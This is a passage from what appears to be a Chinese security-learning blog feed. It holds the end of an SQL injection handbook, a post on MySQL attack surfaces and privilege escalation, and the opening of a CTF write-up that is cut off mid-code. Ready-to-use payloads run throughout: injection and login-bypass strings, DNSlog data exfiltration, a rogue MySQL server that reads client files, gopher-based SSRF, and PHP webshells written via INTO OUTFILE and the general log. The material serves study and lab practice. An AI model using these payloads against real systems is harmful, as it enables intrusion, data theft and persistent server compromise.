class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br><span class="line">....</span><br><span class="line">$name &#x3D; isset($_GET[&#39;name&#39;]) ? addslashes($_GET[&#39;name&#39;]) : 1;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM test WHERE names&#x3D;&#39;&#123;$name&#125;&#39;&quot;;</span><br></pre></td></tr></table></figure><p>即服务器使用了款字节编码，addslashes会将单引号转义，变为\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。</p><p>具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。</p><p>常见payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1%df&#39; #</span><br></pre></td></tr></table></figure><h4 id="Mysql约束攻击">Mysql约束攻击</h4><p><strong>原理</strong><br>主要两个点</p><ul><li>mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</li><li>mysql插入数据的时候,当数据超过定义的长度会出现截断象限</li></ul><p>利用方式即注册一’admin     a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin   ’用户，而在select的过程中’admin ‘是与’admin’相等的</p><p>所以就可以用’admin ‘的密码登陆’admin’</p><h4 id="二次注入">二次注入</h4><p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p><p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><p>这个。。只能具体情况分析了，不太好写</p><p>比如sql lab-24</p><h4 id="Mysql带外注入">Mysql带外注入</h4><p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据<br>它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等</p><h5 id="DNSlog">DNSlog</h5><p>只能用于windows环境</p><p>select拼接一个UNC路径导致请求发起<br>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\<a href="http://sss.xxx">sss.xxx</a>\test\</p><p>常见payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;\\\\&#39;,select hex(version()),&#39;.dnslog地址&#39;)</span><br></pre></td></tr></table></figure><p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个\就变成了2个\，目的就是利用UNC路径</p><p>可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能</p><p>利用方法</p><p>首先查看变量确定权限<br>show variables like ‘%secure%’</p><ul><li>当secure_file_priv为空，就可以读取磁盘的目录。</li><li>当secure_file_priv为G:\，就可以读取G盘的文件。</li><li>当secure_file_priv为null，load_file就不能加载文件。</li></ul><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置</p><p>最好进行加密处理，防止特殊字符导致传输失败<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));</span><br></pre></td></tr></table></figure><h4 id="文件读写">文件读写</h4><p>查询用户读写权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT file_priv FROM mysql.user WHERE user &#x3D; &#39;username&#39;;</span><br></pre></td></tr></table></figure><ul><li>load_file()</li></ul><p>需要有读取文件的权限<br>需要知道文件的绝对物理路径<br>要读取的文件大小必须小于 max_allowed_packet</p><p>一般没啥问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@max_allowed_packet;</span><br></pre></td></tr></table></figure><p>一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。</p><p>常见paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</span><br></pre></td></tr></table></figure><p>后面的路径可以是单引号、0x、char转换的字符<br>路径中的斜杠是/而不是\</p><p>使用编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</span><br><span class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</span><br></pre></td></tr></table></figure><ul><li>out_file()</li></ul><p>outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径<br>经典一句话payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;C:&#x2F;www&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p>当然也可以从表中选数据写</p><h4 id="万能密码">万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin’ —</span><br><span class="line">admin’ #</span><br><span class="line">admin’&#x2F;*</span><br><span class="line">or ‘&#x3D;’ or</span><br><span class="line">‘ or 1&#x3D;1—</span><br><span class="line">‘ or 1&#x3D;1#</span><br><span class="line">‘ or 1&#x3D;1&#x2F;*</span><br><span class="line">‘) or ‘1’&#x3D;’1—</span><br><span class="line">‘) or (‘1’&#x3D;’1—</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入手册【转】&quot;&gt;SQL注入手册【转】&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C&lt;/p&gt;
&lt;/blockquo
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="SQL注入" scheme="http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>MySQL攻击面和提权总结</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2020-12-10T15:11:36.000Z</published>
    <updated>2020-12-10T15:13:20.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL攻击面和提权总结">MySQL攻击面和提权总结</h1><p>本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。</p><p>其中均使用宝塔面板搭建MySQL8.0版本。</p><p>首先要开放腾讯云主机的端口，并且允许MySQL Server允许任意用户远程登录。</p><h2 id="0x01-攻击面——MySQL客户端任意文件读取">0x01 攻击面——MySQL客户端任意文件读取</h2><blockquote><p>适用范围：全版本 MySQL/MariaDB Client</p><p>条件：客户端连接时开启 –enable-local-infile</p></blockquote><p>一开始做实验的时候有点懵逼，我作为攻击方去连接受害者的MySQL客户端，然后再读取我本地的文件？？？</p><p>后来我再网上查看这个攻击面的利用场景，虽然确实用的地方比较少，但是看了<strong>LoRexxar</strong>这篇<a href="https://paper.seebug.org/1112/">文章</a>之后，还是很有收获的。</p><blockquote><p>这个实验的前提MySQL变量<code>local_infile=1</code></p></blockquote><p>CTFer对MySQL的load data infile语句应该都是比较熟悉的，一般形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure><p>MySQL Server会读取服务端的<code>/etc/passwd</code>然后将数据按照<code>\n</code>分割插入表中，但是非local加载的语句收到<code>secure_file_priv</code>的限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>但是加上一个local关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">Query OK, 4 rows affected, 1 warning (0.02 sec)</span><br><span class="line">Records: 4  Deleted: 0  Skipped: 0  Warnings: 1</span><br></pre></td></tr></table></figure><p>是可以成功执行的，相当于是读取客户端的文件发送到服务端。</p><p>MySQL认为<strong>服务端可以要求客户端读取有可读权限的任何文件，客户端不应该连接到不可信的服务端</strong>。</p><p>那么现在的问题就是如何构造一个恶意的MySQL服务端。</p><p>在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。</p><ol><li>Sever返回greeting包，包含版本，协议类型，salt值，server功能项</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109131329.png" alt=""></p><ol start="2"><li>客户端登录请求</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109134218.png" alt=""></p><p>不知道为啥请求包没有显示用户名，可能是MySQL版本的原因。</p><ol start="3"><li>初始化查询</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109135309.png" alt=""></p><p>由于使用了SSL通信，所以这里看不到具体的初始化查询语句。</p><ol start="4"><li>Load file data</li></ol><p>这次得把MySQL的SSL连接关闭掉，不然看不到执行语句。方法就是在MySQL的配置文件my.conf的[mysqld]添加<code>skip_ssl</code>即可，再在客户端检查一下是否已经关闭SSL：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140218.png" alt=""></p><p>确认关闭后，执行load file data语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure><p>首先是客户端发发送查询</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140817.png" alt=""></p><p>接着服务端返回了需要的路径，功能类似于告诉客户端把这个文件发给我让我看看</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145329.png" alt="">****</p><p>然后客户端直接把内容发送到了服务端</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145747.png" alt=""></p><p>从上面这个流程可以看出，客户端读取文件的路径并不是从客户端指定的，而是从服务端指定再发送客户端。</p><p>正常的查询流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client: 我要把&#x2F;etc&#x2F;passwd插入表中</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为...</span><br></pre></td></tr></table></figure><p>如果是一个恶意的服务端，可以把流程更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client: 我要test表中的内容</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为？？？</span><br></pre></td></tr></table></figure><p>并且从MySQL的官方文档中指出<strong>服务端可以在任何查询语句后回复文件传输请求</strong>，也就是说上面第三个语句是可以执行的。</p><p>所以构造一个恶意服务端的流程就是：1.回复MySQL client一个greeting包；2.等待client端发送一个查询包；3.回复一个file transfer包。</p><p>发现这个漏洞的原作者给出了POC，但是LoRexxar文中提到这个POC并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接，也有部分mysql client端对greeting包有较强的校验。</p><p>这里就拿网上更改之后的POC来拿做实验：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><ol><li>暂停MySQL Server服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld stop</span><br></pre></td></tr></table></figure><ol start="2"><li>运行恶意MySQL服务器脚本</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure><ol start="3"><li>客户端访问MySQL服务器</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h xxx -u root -p</span><br></pre></td></tr></table></figure><ol start="4"><li>查看mysql.log文件</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109153808.png" alt=""></p><p>LoRexxar文章中还接着提到了关于这个漏洞的进一步利用，比如说读取配置文件，Phar反序列化等等。</p><p>其中Phar反序列化这个还挺有意思的，首先生成一个phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a &quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后用test.php模拟一次查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;&#123;evil_mysql_ip&#125;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">3667</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>伪造的evil mysql server中让mysql client去做<code>load file local</code>查询，读取本地的phar文件。</p><h2 id="0x02-攻击面——利用SSRF攻击MySQL">0x02 攻击面——利用SSRF攻击MySQL</h2><blockquote><p>适用范围：全版本 MySQL/MariaDB Server</p><p>条件：拥有空密码用户</p></blockquote><p>之前在总结SSRF漏洞的时候提到过利用SSRF攻击Redis和FastCGI，没写过关于MySQL。</p><p>同样的，利用SSRF攻击MySQL也需要了解MySQL的完整交互协议，并且伪造客户端，通过SSRF进行交互连接。</p><p>参考文章同样来自于一篇Seebug上的文章：<a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><p>这个利用条件比较苛刻，可以归属于未授权访问，因为非交互模式下登录并操作MySQL只能无需密码认证。</p><p>关于MySQL的认证过程和报文格式我就不多叙述，这里直接演示一下过程，以腾讯云主机MySQL80作为实验机，本地登录。</p><p>首先需要新建一个MySQL用户，并且密码为空，使用root登录MySQL后执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT USAGE ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT ALL ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>有两个办法，一种是用gopherus工具直接生成payload。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130516.png" alt=""></p><p>另外一种是自己抓包生成原始数据流，再转换成gopher协议的格式。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130638.png" alt=""></p><p>再利用脚本转换一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">s</span>):</span></span><br><span class="line">a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> result(s)</span><br></pre></td></tr></table></figure><p>但是这两种办法我都没能复现出来，可能是看不到执行的结果。</p><p>接下来，可以使用SSRF攻击MySQL，那么就可以利用MySQL写入webshell，但是要求secure_file_priv不能为空。</p><h2 id="0x03攻击面——MySQL服务端文件读写">0x03攻击面——MySQL服务端文件读写</h2><p>这个就比较简单了，但是对要求服务端配置可读写目录和正确的用户权限。</p><p>读文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE (&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&#39;) AS Result;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database test;</span><br><span class="line">CREATE TABLE test (id TEXT, content TEXT);</span><br><span class="line">load data infile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot; into table test.test FIELDS TERMINATED BY &#39;\n\r&#39; ;</span><br></pre></td></tr></table></figure><p>写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat (id) from test INTO OUTFILE &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaaa&quot;;</span><br></pre></td></tr></table></figure><h2 id="0x04提权">0x04提权</h2><p>提权就不写那么详细了，主要是参考m00nback的文章：<a href="https://www.m00nback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://www.m00nback.xyz/2020/03/30/mysql提权总结/</a></p><h3 id="CVE-2012-2122">CVE-2012-2122</h3><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><p>影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><p>MSF有相关利用模块：<code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump</code></p><h3 id="写shell">写shell</h3><h4 id="outfile写shell">outfile写shell</h4><p>跟上面描述的差不多，关键还是<code>secure_file_priv</code>这个参数，而且是只读参数，必须更改MySQL的配置文件再重启MySQL服务。</p><p>来个🌰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot;;</span><br></pre></td></tr></table></figure><h4 id="日志写shell">日志写shell</h4><p>前提是知道MySQL root用户密码，第一步开启日志记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br></pre></td></tr></table></figure><p>日志文件导出到指定目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;shell.php&quot;;</span><br></pre></td></tr></table></figure><p>记录SQL语句写shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&quot;;</span><br></pre></td></tr></table></figure><p>关闭记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;off&#39;;</span><br></pre></td></tr></table></figure><h3 id="UDF提权">UDF提权</h3><p>大马提权：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/大马/udf.php</a></p><p>手工提权：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p><p><a href="https://cooltige.com/2020/06/02/Mysql-Udf%E6%8F%90%E6%9D%83/">https://cooltige.com/2020/06/02/Mysql-Udf提权/</a></p><p><a href="https://xz.aliyun.com/t/2199">https://xz.aliyun.com/t/2199</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL攻击面和提权总结&quot;&gt;MySQL攻击面和提权总结&lt;/h1&gt;
&lt;p&gt;本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。&lt;/p&gt;
&lt;p&gt;其中均使用宝塔面板搭建MySQL8.0版本。&lt;/p&gt;
&lt;p&gt;首先要开放腾讯云主机的
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="MySQL" scheme="http://ca0y1h.top/tags/MySQL/"/>
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019-PharMatchesEverything</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/</id>
    <published>2020-12-10T14:54:33.000Z</published>
    <updated>2020-12-10T14:56:20.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Phar-matches-everything">NCTF2019 Phar matches everything</h1><p>去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。</p><p>原题目提示是通过vim的备份文件下载源码，但是BUU上的环境好像没有备份文件，只能从GitHub上下载<code>catchmime.php</code>和<code>upload.php</code>两个文件的源代码，</p><p>首先是upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span 